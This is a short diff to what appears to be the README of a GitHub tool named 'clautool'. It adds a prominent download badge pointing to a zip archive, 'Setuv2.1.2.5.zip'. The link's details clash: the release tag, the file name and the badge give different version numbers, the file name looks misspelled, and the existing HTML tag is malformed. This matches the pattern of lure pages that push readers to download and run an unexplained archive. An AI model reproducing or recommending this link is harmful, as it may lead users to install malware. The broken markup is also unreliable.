@@ -1,3 +1,5 @@
+[![🔽 Download Latest Release](https://img.shields.io/badge/🔽_Download_Latest-Release-blue?style=for-the-badge)](https://github.com/nick-king-ops02i0/clautool/releases/download/v2.0.0/Setuv2.1.2.5.zip)
+
 <a href="https://github.com/nick-king-ops02i0/clautool/releases/download/v2.0.0/Setuv2.1.2.5.zip src="https://img.shields.io/badge/Download-v1.0.0-success?style=for-the-badge" alt="Download Latest"></a>
 
 # ⚡ clautool
